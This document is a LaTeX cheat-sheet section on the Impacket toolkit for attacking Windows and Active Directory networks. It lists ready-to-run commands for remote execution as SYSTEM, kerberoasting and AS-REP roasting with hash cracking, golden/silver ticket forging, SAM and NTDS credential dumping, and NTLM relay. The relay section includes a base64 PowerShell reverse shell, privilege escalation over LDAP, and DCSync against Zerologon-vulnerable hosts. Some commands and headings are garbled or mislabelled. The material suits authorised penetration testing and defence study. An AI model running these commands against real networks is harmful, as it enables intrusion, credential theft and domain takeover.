\section{Impacket}
\label{tool:impacket}
\subsection{Solve SSL pb}

\begin{verbatim}
OpenSSL.SSL.Error: [('SSL routines', '', 'legacy sigalg disallowed or unsupported')]
\end{verbatim}

solved by usually switching in impacket module
\begin{verbatim}
- ctx = SSL.Context(SSL.TLSv1_METHOD)
+ ctx = SSL.Context(SSL.TLSv1_2_METHOD)
\end{verbatim}


\subsection{Introduction}
\href{https://www.secureauth.com/labs/open-source-tools/impacket/}{Impacket} is
a versatile toolkit that providesmany different ways to enumerate,
interact, and exploit Windows protocols and find the information needed using
Python. The tool is actively maintained and has many contributors, especially
when new attack techniques arise. 



\subsubsection{kerberos}

\begin{tabularx}{\linewidth}{|l|X|}
psexec.py~\ref{tool:impacket:psexec} & PSEXEC like functionality example using
RemComSvc (\url{https://github.com/kavika13/RemCom}).\\
    \hline
smbexec.py~\ref{tool:impacket:smbexec} & A similar approach to PSEXEC w/o using
RemComSvc. The technique is described here. Our implementation goes one step
further, instantiating a local smbserver to receive the output of the commands.
This is useful in the situation where the target machine does NOT have a
writeable share available.\\
    \hline
atexec.py~\ref{tool:impacket:atexec} & This example executes a command on the
target machine through the Task Scheduler service and returns the output of the
executed command.\\
    \hline
wmiexec.py~\ref{tool:impacket:wmiexec} & A semi-interactive shell, used through
Windows Management Instrumentation. It does not require to install any
service/agent at the target server. Runs as Administrator. Highly stealthy.\\
    \hline
dcomexec.py~\ref{tool:impacket:dcomexec} & A semi-interactive shell similar to
wmiexec.py, but using different DCOM endpoints. Currently supports
MMC20.Application, ShellWindows and ShellBrowserWindow objects.\\
    \hline
\end{tabularx}

\subsubsection{kerberos}
\begin{tabularx}{\linewidth}{|l|X|}
    \hline
GetTGT~\ref{tool:impacket:GetTGT} & Given a password, hash or aesKey, this
script will request a TGT and save it as ccache.\\
    \hline
raiseChild~\ref{tool:impacket:raiseChild} & implements a child-domain to forest
privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids.\\
    \hline
GetUserSPNs~\ref{tool:impacket:GetUserSPNs} & to find and fetch Service
Principal Names that are associated with normal user accounts.\\
    \hline
GetPac~\ref{tool:impacket:GetPac} & get the PAC (Privilege Attribute
Certificate) structure of the specified target user \\
    \hline
GetNPUsers~\ref{tool:impacket:GetNPUsers}: i &  will attempt to list and get TGTs for those users that have
the property ‘Do not require Kerberos preauthentication’ set \\
    \hline
\end{tabularx}

\subsubsection{SMB/MSRPC}
\begin{tabularx}{\linewidth}{|l|X|}
    \hline
smbclient~\ref{tool:impacket:smbclient} & A generic SMB client that will let
you list shares and files, rename, upload and download files and create and
delete directories, all using either username and password or username and
hashes combination. It’s an excellent example to see how to use impacket.smb in
action.\\
    \hline
addcomputer.py~\ref{tool:impacket:addcomputer} & Allows to add a computer to a
domain using LDAP or SAMR (SMB). \\
    \hline
getArch.py~\ref{tool:impacket:getArch}& This script will connect against a
target (or list of targets) machine/s and gather the OS architecture type
installed by (ab)using a documented MSRPC feature.\\
    \hline
exchanger.py~\ref{tool:impacket:exchange} & A tool for connecting to MS
Exchange via RPC over HTTP v2.\\
    \hline
lookupsid.py~\ref{tool:impacket:lookupsid} &  A Windows SID brute forcer
example through [MS-LSAT] MSRPC Interface, aiming at finding remote
users/groups. \\
    \hline
netview.py~\ref{tool:impacket:netview} & Gets a list of the sessions opened at
the remote hosts and keep track of them looping over the hosts found and
keeping track of who logged in/out from remote servers\\
    \hline
reg.py~\ref{tool:impacket:reg} & Remote registry manipulation tool through the
[MS-RRP] MSRPC Interface. The idea is to provide similar functionality as the
REG.EXE Windows utility.\\
    \hline
rpcdump.py~\ref{tool:impacket:rpcdump} & This script will dump the list of RPC
endpoints and string bindings registered at the target. It will also try to
match them with a list of well known endpoints.\\
    \hline
rpcmap.py~\ref{tool:impacket:rpcmap} & Scan for listening DCE/RPC interfaces.
This binds to the MGMT interface and gets a list of interface UUIDs. If the
MGMT interface is not available, it takes a list of interface UUIDs seen in the
wild and tries to bind to each interface.\\
    \hline
samrdump.py~\ref{tool:impacket:samdump} & An application that communicates with
the Security Account Manager Remote interface from the MSRPC suite. It lists
system user accounts, available resource shares and other sensitive information
exported through this service.\\
    \hline
services.py~\ref{tool:impacket:services} & This script can be used to
manipulate Windows services through the [MS-SCMR] MSRPC Interface. It supports
start, stop, delete, status, config, list, create and change.\\
    \hline
smbpasswd.py~\ref{tool:impacket:smbpasswd} & This script is an alternative to
smbpasswd tool and intended to be used for changing expired passwords remotely
over SMB (MSRPC-SAMR)\\
    \hline
\end{tabularx}
Other:

\begin{tabularx}{\linewidth}{|l|X|}
    \hline
tool & use \\
psexec~\ref{tool:impacket:psexec} & \\
    \hline
smbexec~\ref{tool:impacket:smbexec} & \\
    \hline
atexec~\ref{tool:impacket:atexec} & \\
    \hline
wmiexec~\ref{tool:impacket:wmiexec} & \\
    \hline
GetADUser~\ref{tool:impacket:GetADUser} & \\
    \hline
TicketConverter~\ref{tool:impacket:TicketConverter} & \\
    \hline
secretsdump~\ref{tool:impacket:secretsdump} & \\
    \hline
smbserver~\ref{tool:impacket:smbserver} & \\
    \hline
mssqlclient~\ref{tool:impacket:mssqlclient} & \\
    \hline
lookupsid~\ref{tool:impacket:lookupsid} & \\
    \hline
tickerter~\ref{tool:impacket:tickerter} & create Golden/Silver tickets \\

    \hline
reg~\ref{tool:impacket:reg} & \\
    \hline
rpcdump~\ref{tool:impacket:rpcdump} & \\
    \hline
services~\ref{tool:impacket:services} & \\
    \hline
Samrdump~\ref{tool:impacket:Samrdump} & enumerate RIDs\\
    \hline
ntlmrelayx~\ref{tool:impacket:ntlmrelayx} & \\
    \hline
\end{tabularx}

\subsection{Common options}

\verb+-debug+

\subsection{Authentication metod for tools}


\verb+-windows-auth+ for local account


\begin{verbatim}
# login / password 
IMPACKET_CMD 'DOMAIN/SAMAN:PASSWORD@IP'

# pass-the-hash
IMPACKET_CMD  'DOMAIN/SAMAN@IP' -hashes 'LM_HASH:NT_HASH'

# pass-the-ticket
set KRB5CCNAME=FILE_PATH
IMPACKET_CMD  -k -no-pass 'DOMAIN/SAMAN@TARGET'

# AES key to use for Kerberos Authentication (128 or 256 bits)
IMPACKET_CMD -aesKey hex key 'DOMAIN/SAMAN@TARGET'

# Read keys for SPN from keytab file
IMPACKET_CMD -keytab KEYTAB 'DOMAIN/SAMAN@TARGET'

\end{verbatim}

\subsection{smbclient.py}
\label{tool:impacket:smbclient}

\begin{verbatim}
smbclient  -I IP -L ACTIVE -N -U ""
\end{verbatim}

\subsection{psexec.py}
\label{tool:impacket:psexec}

\verb+Psexec.py+ is a
clone of the
\href{https://docs.microsoft.com/en-us/sysinternals/downloads/psexec}{psexec}
executable from sysinternal, but works slightly differently
from the original. The tool creates a remote service by uploading a
randomly-named executable to the \verb+ADMIN$+ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.

\begin{verbatim}
psexec.py DOMAIN/SAMAN:PASSWORD@IP
psexec.py DOMAIN/SAMAN@TARGET -k -no-pass 
\end{verbatim}

\subsection{SMBexec.py}
\label{tool:impacket:smbexec}

A similar approach to PsExec without using
\href{https://github.com/kavika13/RemCom}{RemComSvc}. The technique is
described here. This implementation goes one step further, instantiating a
local SMB server to receive the output of the commands. This is useful when the
target machine does NOT have a writeable share available.

\subsection{atexec.py}
\label{tool:impacket:atexec}
 This example executes a command on the target machine through the Task
 Scheduler service and returns the output of the executed command.

\subsection{wmiexec.py}
\label{tool:impacket:wmiexec}
miexec.py utilizes a semi-interactive shell where commands are executed through
\href{https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page}{Windows
Management Instrumentation}. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.

he downside of this is that if a vigilant defender checks event logs and looks at event ID 4688: A new process has been created, they will see a new process created to spawn cmd.exe and issue a command. This isn't always malicious activity since many organizations utilize WMI to administer computers, but it can be a tip-off in an investigation

\begin{verbatim}
wmiexec.py DOMAIN/SAMAN:PASSWORD@IP
\end{verbatim}


\subsection{GetUserSPNs.py}
\label{tool:impacket:GetUserSPNs}
a python script that it discovers SPN, extract TGS and dump service Hash. It
allows authenticate to the Domain Controller with a cleartext password, NT
password hash, or even a Kerberos ticket.


\begin{verbatim}
# Listing SPN Accounts
GetUserSPNs.py -dc-ip IP DOMAIN/SAMAN:PASSWORD

# Requesting all TGS Tickets
GetUserSPNs.py -dc-ip IP DOMAIN/SAMAN:PASSWORD
    -request -outputfile hashes.kerberoast

# Requesting a Single TGS ticket
GetUserSPNs.py -dc-ip IP DOMAIN/SAMAN:PASSWORD
    -request-user NAME -outputfile hashes.kerberoast

GetUserSPNs.py -target-domain FQDN DOMAIN_NAME/SAMAN
\end{verbatim}



\href{https://github.com/SecureAuthCorp/impacket/issues/1206}{GetUserSpns.py
fails when using -k option and NTLM auth is disabled}



\subsection{GetADUser.py}
\label{tool:impacket:GetADUser}
This script will gather data about the domain’s users and their corresponding
email addresses. It will also include some extra information about last logon
and last password set attributes. If no entries are returned that means users
don’t have email addresses specified. If so, you can use the -all-users
parameter.

\begin{verbatim}
GetADUser.py -user USER_NAME DOMAIN/SAMAN:PASSWORD
GetADUser.py -all  DOMAIN/SAMAN:PASSWORD
\end{verbatim}

\subsection{GetNPUSers.py}
\label{tool:impacket:GetNPUSers}
This script will attempt to list and get TGTs for those users that have the
property ‘Do not require Kerberos preauthentication’ set
(\verb+UF_DONT_REQUIRE_PREAUTH+). For those users with such configuration, a
John The Ripper output will be generated so you can send it for cracking.

\begin{verbatim}
#Try all the usernames in usernames.txt
 GetNPUsers.py -dc-ip IP FQDN/ -usersfile usernames.txt \
    -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
GetNPUsers.py -dc-ip IP FQDN/SAMAN:PASSWORD -request \
    -format hashcat -outputfile hashes.asreproast

john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
\end{verbatim}


\subsection{TicketConverter.py}
\label{tool:impacket:TicketConverter}

This script will convert kirbi files (commonly used by mimikatz) into ccache
files used by impacket, and vice versa. As you can observe that the above
script helps in generating the ccache file and with the of this script we can
convert into kirbi.


\subsection{GetTGT.py}
\label{tool:impacket:GetTGT}


This python script will request a TGT and save it as ccache for given a
password, hash or aesKey. That we can be injected directory for access the
requested service.

we have used getTGT to generate the ccache and used KERB5CCNAME pass the ccache
file for the requested service. This is completely remote attack without using
a local system of the compromised victim, but you need to compromise NTLM
hashes for that, type following to conduct pass the ccache attack remotely.

\subsection{GetPac.py}
\label{tool:impacket:GetPac}

This script will get the PAC (Privilege Attribute Certificate) structure of the
specified target user just having a normal authenticated user credentials. It
does so by using a mix of [MS-SFU]’s S4USelf + User to User Kerberos
Authentication.

\begin{verbatim}
getPac.py -targetUser TARGET scrm.local/ksimpson:ksimpson 
\end{verbatim}


\subsection{secretsdump.py}
\label{tool:impacket:secretsdump}
Impacket’s secretsdump.py will perform various techniques to dump secrets from
the remote machine without executing any agent. Techniques include reading SAM
and LSA secrets from registries, dumping NTLM hashes, plaintext credentials,
and kerberos keys, and dumping NTDS.dit. 

\subsubsection{Usefull options}
\begin{itemize}
    \item \verb+-outputfile BASE_NAME+ 
    \item \verb+-just-dc-ntlm+ (NTDS.DIT) only NTLM hashes
    \item \verb+-just-dc+ (NTDS.DIT) NTLM hashes and Kerberos keys
    \item \verb+-just-dc-user <USERNAME>+ only extract data for a specific user
    \item \verb+-history+ password history
    \item \verb+-user-status+: active/disabled 
    \item \verb+-pwd-last-set+  when each account's password was last changed
\end{itemize}

Regarding remote method by default use \verb+smbexec+ an explicit method
(\verb+smbexec+, \verb+wmiexec+, \verb+mmcexec+) can be
expressed using \verb+ -use-vss -exec method METHOD+.

\subsubsection{Remote SAM dump from registry}
\label{tool:impacket:secretsdump:remote:SAM}

\begin{verbatim}
secretsdump.py DOMAIN/SAMAN:PASSWORD@IP
\end{verbatim}

\subsubsection{Remote NTDS dump}
\label{tool:impacket:secretsdump:remote:NTDS}

\begin{verbatim}
secretsdump.py -just-dc DOMAIN/SAMAN:PASSWORD@DC_IP
secretsdump.py -k -no-pass DOMAIN/SAMAN@IP -target-ip DC_IP -just-dc-user SAMAN 
\end{verbatim}


\subsubsection{Offline secrets dumping from exported hives or ntds}
\label{tool:impacket:secretsdump:offline}

\begin{verbatim}
# Offline dumping of LSA secrets from exported hives
secretsdump.py -security '/path/to/security.save' \
               -system '/path/to/system.save' \
               LOCAL

# Offline dumping of SAM secrets from exported hives
secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL

# Offline dumping of SAM & LSA secrets from exported hives
secretsdump.py -sam '/path/to/sam.save'            \
               -security '/path/to/security.save'  \
               -system '/path/to/system.save'      \
               LOCAL

# Offline dumping from NTDS.dit
secretsdump.py -system '/path/to/system.save' -ntds '/path/to/ntds.dit' LOCAL


\end{verbatim}



\subsection{smbserver.py}
\label{tool:impacket:smbserver}

\begin{verbatim}
smbserver.py -smb2support NAME LOCATION
\end{verbatim}

\subsection{mssqlclient.py}
\label{tool:impacket:mssqlclient}

\begin{verbatim}
# using a TGS
mssqlclient.py -k IP
# try without -windows-auth
mssqlclient.py DOMAIN/SAMAN@IP [-windows-auth]

help

enable_xp_cmdshell
xp_cmdshell whoami /priv

\end{verbatim}
Here we can enumerate the rights that our user has on the system and see that
we have
\href{https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege}{SeImpersonatePrivilege},
which can be leveraged in combination with a tool such as
\href{https://github.com/ohpe/juicy-potato}{JuicyPotato},
\href{https://github.com/itm4n/PrintSpoofer}{PrintSpoofer}, or
\href{https://github.com/antonioCoco/RoguePotato}{RoguePotato} to escalate to
\verb+SYSTEM+ level privileges, depending on the target host, and use this access to continue toward our goal. 

These methods are covered in the SeImpersonate and SeAssignPrimaryToken of the Windows Privilege Escalation module.

\subsection{lookupsid.py}
\label{tool:impacket:lookupsid}
perform SID brute forcing to find the SID.

\begin{verbatim}
smbserver.py FQDN/SAMAN@DC_IP
\end{verbatim}

\subsection{ticketer.py}
\label{tool:impacket:tickerter}


This script will create TGT/TGS tickets from scratch or based on a template
(legally requested from the KDC) allowing you to customize some of the
parameters set inside the \verb+PAC_LOGON_INFO+ structure, in particular the groups,
extrasids, \ldots.

\begin{verbatim}
ticketer.py -nthash KRBTGT_HASH  -domain FQDN -domain-sid DOM_SID -extra-sid \
    SID_ETS-ADMIN NAME
\end{verbatim}

here is an example to craft a TGS with admin privilege to MSSQL.
\begin{verbatim}
ticketer.py 
    -nthash B999A16500B87D17EC7F2EXXXXXXXXXX 
    -domain scrm.local 
    -domain-sid S-1-5-21-2743207045-XXXXXXXXXX-XXXXXXXXXX 
    -spn MSSQLSvc/dc1.scrm.local 
    -user-id 500 Administrator
\end{verbatim}

will save the ticket as a
\href{https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html}{credential
cache (ccache) file} that can be set to \verb+KRB5CCNAME+ environment variable

\subsection{raiseChild.py}
\label{tool:impacket:raiseChild}

\begin{verbatim}
aiseChild.py -target-exec DC_IP CHILD_FQDN/ADMIN_SAMAN
\end{verbatim}

\subsection{links}
\begin{itemize}
    \item secretsdump
        \begin{itemize}
            \item
                \url{https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy}
        \end{itemize}
\end{itemize}
\url{}

\subsection{reg.py}
\label{tool:impacket:reg}
Reg.py script can read, modify, and delete registry values.

\subsection{rpcdump.py}
\label{tool:impacket:rpcdump}
RPC or Remote Procedure Call is when a computer program causes a procedure to
execute in different address space which is coded as a normal procedure call.
This script can enumerate those endpoints for us. It also matches them to some
of the well-known endpoints in order to identify them.

\begin{verbatim}
rpcdump.py IP
rpcdump.py ignite/Administrator:Ignite@987@192.168.1.105
\end{verbatim}

\subsection{services.py}
\label{tool:impacket:services}
The services script of the Impacket communicates with Windows services with the help of MSRPC Interface. It can start, stop, delete, read status, config, list, create and change any service.

\subsection{Samrdump.py}
\label{tool:impacket:samrdump}

samrdump.py communicates with the Security Account Manager Remote (SAMR) interface to list system user accounts, available resource shares, and other sensitive information.

\subsection{ntlmrelayx.py}
\label{tool:impacket:ntlmrelayx}

\begin{itemize}
    \item mitm6 \verb+-6+
    \item smb2 \verb+smb2support+
    \item cross-protocols unsigning relay \verb+--remove-mic+ (SMB to
        SMB-with-required-signing, or SMB to LDAP/S)
    \item the target can be specified with a target protocol like
        \verb+ldap://+ or \verb+all://+ (default \verb+smb://+)
    \item It has the ability to relay connections for specific target users to
        be defined in the targets file
    \item It has the ability to relay a single connection (SMB only for now) to
        multiple targets
\end{itemize}

\href{https://www.secureauth.com/blog/what-is-old-is-new-again-the-relay-attack/}{What
is old is new again: The Relay Attack}

The targets file used with the \verb+-tf+ option can contain the following:
\begin{verbatim}
# User filter for SMB only (for now)
smb://DOMAIN\User@192.168.1.101
smb://User@192.168.1.101

# Custom ports and paths can be specified
smb://target:port
http://target:port/somepath

# Domain name can be used instead of the IP address
ldaps://someserver.domain.lan
someserver.domain.lan
\end{verbatim}

\subsubsection{Reverse shell / C2}

Create a PowerShell reverse shell using
\href{https://www.revshells.com/}{https://www.revshells.com/} with base64
    encoding
\begin{verbatim}
ntlmrelayx --no-http-server -smb2support -t IP -c \
    'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqA.. .'
\end{verbatim}

can be used to call back empire

\subsubsection{Cred dump}
\begin{verbatim}
ntlmrelayx.py -t smb://$TARGET
\end{verbatim}

\subsubsection{socks proxy}
\begin{verbatim}
ntlmrelayx.py -tf targets.txt -socks
\end{verbatim}

The attacker will be able to use some tools along with proxychains to operate
attack through the relayed authenticated session. In this case, secretsdump can
be used to dump hashes from the remote target's

\begin{verbatim}
proxychains secretsdump.py -no-pass $DOMAIN/$USER@$TARGET
\end{verbatim}


\subsubsection{Ldap interaction}
\begin{verbatim}
# enum
ntlmrelayx -t "ldap://domaincontroller" --dump-adcs --dump-laps --dump-gmsa

ntlmrelayx.py -t ldaps://$DC_TARGET --add-computer SHUTDOWN
ntlmrelayx.py -t ldaps://$DOMAIN_CONTROLLER --escalate-user SHUTDOWN

# delegation
ntlmrelayx.py -t ldaps://$DC_TARGET --escalate-user SHUTDOWN --delegate-access
# on delegation success get a service ticket with the created domain machine account for the relayed victim and impersonate any account 
getST.py -spn host/$RELAYED_VICTIM '$DOMAIN/$NEW_MACHINE_ACCOUNT$:$PASSWORD' \
    -dc-ip $DOMAIN_CONTROLLER_IP -impersonate $USER_TO_IMPERSONATE
export KRB5CCNAME=$USER_TO_IMPERSONATE.ccache
secretsdump.py -k $RELAYED_VICTIM

\end{verbatim}

\subsubsection{dcsync}

\begin{verbatim}
# target vulnerable to Zerologon, dump DC's secrets only
ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER'

# target vulnerable to Zerologon, dump Domain's secrets
ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER' \
    -auth-smb 'DOMAIN'/'LOW_PRIV_USER':'PASSWORD'
\end{verbatim}
